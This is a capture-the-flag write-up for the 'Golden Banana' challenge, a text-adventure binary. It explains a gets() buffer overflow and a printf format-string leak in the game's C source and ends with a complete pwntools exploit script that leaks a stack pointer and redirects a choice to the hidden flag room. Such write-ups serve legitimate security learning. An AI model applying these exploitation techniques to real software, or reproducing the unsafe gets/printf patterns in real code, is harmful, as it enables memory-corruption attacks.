### Description

We are given a tar.gz file containing a binary with source code and game-data, together with a docker setup.

>The Quest for the Golden Banana is a text-based adventure game that combines humor, action, and mystery in an epic story that will keep you hooked until the end. Explore exotic locations, interact with colorful characters, and make choices that will shape your destiny. Do you have what it takes to complete The Quest for the Golden Banana?
>
>The story for this challenge was entirely written by the Bing AI chatbot :-)
>
>`nc chals.damctf.xyz 30234`
>
>Downloads
>[golden-banana.tar.gz](https://rctf-bucket.storage.googleapis.com/uploads/c0efbd9b573a61a884a18a998720613db8bade14c5b20c80b19bf432a73eff69/golden-banana.tar.gz)

---

### Overview

Given that we have the source, that is an obvious place to start. Without going into much depth, the code loads a `game`-object from `game.dat`, which it uses to specify `locations` and `choices`. It's all neatly described by the structs:

```c
typedef struct _choice {
    char description[MAX_STRING]; // Description of the choice
    location *location;           // Where to go when this choice is chosen
} choice;

typedef struct _location {
    char description[MAX_STRING]; // Description of the location
    choice choices[MAX_CHOICES];  // List of choices
    int num_choices;              // Number of choices
    int end_location;             // Whether the game should end when reaching this location (0 or 1)
} location;

typedef struct _game {
    location *current_location;
    char input_buf[MAX_STRING];
    location locations[MAX_LOCATIONS];
} game;
```

So, the game holds the current location, an input-buffer and a list of locations. Each location holds a description and multiple choices. Each choice has it's own description, which points to what location it routes to. A classic text adventure.

Notably, instead of containing pointers to descriptions, each object instead has a buffer of size `MAX_STRING=1024`. This opens the door to possible corruption, but it also makes the `game`-object absolutely massive, 163840 bytes according to ghidra.

Opening `game.dat`, we find an interesting location, number 15, that seems to contain the flag:

```
15 SECRET ROOM: dam{REDACTED} (server has the real flag)
0
1
```

Critically, none of the choices in the other locations point to this location, so there is no way to get there.

---

### Exploitation

The first obvious vulnerability comes in the main function:

```c
            // Get choice from user
            gets(g.input_buf);
```

A very obvious buffer overflow. Inspecting with ghidra or gdb, we can see that the input buffer is located before the rest of the game object (this can also be seen by examining the struct). So, we can overflow into the rest of the struct, potentially pointing one of the choices at the secret room.

To do this however, we would need a leak. This is where the second vulnerability comes into play:

```c
void print_location(location *l) {
    printf(l->description);
    if (l->end_location) {
        exit(0);
    }
    for (int i = 0; i < l->num_choices; ++i) {
        printf("%d: %s", i + 1, l->choices[i].description);
    }
}
```

The program uses a plain printf to show the location description. If the description gets overwritten, we can simply leak a stack pointer from the stack using "%p".

There is, however, a problem. As the program is arranged, the very first description we can reach is for location 0, and the code flow does not allow us to return to location 0. Therefore, we must overflow one of the other descriptions, but that would mean overwriting pointers in the choices, which would cause the program to segfault.

The solution comes from room 4. Look at the game-data:

```
0 You are a monkey who lives in the jungle. You have heard stories about a golden banana that grants incredible powers to whoever eats it. You want to find this banana and become the king of the jungle. What do you do?
2
1 Go north
2 Go south
0
1 You go north and encounter a river. The river is wide and deep, but you see a vine hanging from a tree on the other side. You think you can swing across the river using the vine. Do you try it?
2
3 Yes, swing across
4 No, go back
0
2 You go south and encounter a snake. The snake is long and venomous, but you see a shiny object in its mouth. It looks like a key. You think you can grab the key from the snake's mouth. Do you try it?
2
5 Yes, grab the key
4 No, go back
0
3 You swing across the river using the vine. You land safely on the other side and see a cave entrance. You wonder if the golden banana is inside the cave. Do you enter it?
2
6 Yes, enter the cave
4 No, swing back
0
4 You decide to go back to where you started. Maybe there is another way to find the golden banana. What do you do?
2
1 Go north
2 Go south
0
```

As it stands, location 4 allows us to return to location 1 or 2, without having to use pointers that are in the way. So, we navigate to location 4, overwrite until location 1 description, after which we can leak a stack pointer.

From here, the challenge is simple. At this point, we are at location 1, therefore, we must simply overwrite choice 1 or 2 of location 1 with a pointer to location 15.

---

### Solution

The entire solve script looks like this:

```python
from pwn import *

elf = context.binary = ELF("./golden_banana")

context.gdbinit = "~/tools/peda/peda.py"
# conn = gdb.debug("./golden_banana", '''
# b *(&main+189)
# c
# ''')

# conn = process("./golden_banana")
conn = connect("chals.damctf.xyz", 30234)

conn.recvuntil(b"south\n")
conn.sendline(b"1")  # Navigate to location 1

conn.recvuntil(b"back\n")
conn.sendline(b"2")  # Navigate to location 4

payload = b"\x00" * 6184  # Padding until north description
payload += b"%p"  # First stack value is a stack pointer

conn.recvuntil(b"south\n")
conn.sendline(payload)  # Overwrite location 1's description

leak = eval(conn.recvline().split(b"1:")[0])
print(f"Leaked stack address {hex(leak)}")

gets_start = leak - 0x58a0  # Address input buffer
target_address = leak - 0x3878  # Address of location 1, choice 1 (location pointer)
target_pointer = leak + 0xd9b8  # Address of secret room

print(f"Writing {hex(target_pointer)} to {hex(target_address)}")

padding = target_address - gets_start
payload = b"\x00" * padding
payload += p64(target_pointer)

conn.recvuntil(b"back\n")
conn.sendline(payload)  # We don't need to specify room choice: find_match figures it out

conn.interactive()
```

The offsets are calculated manually from debugging with gdb.
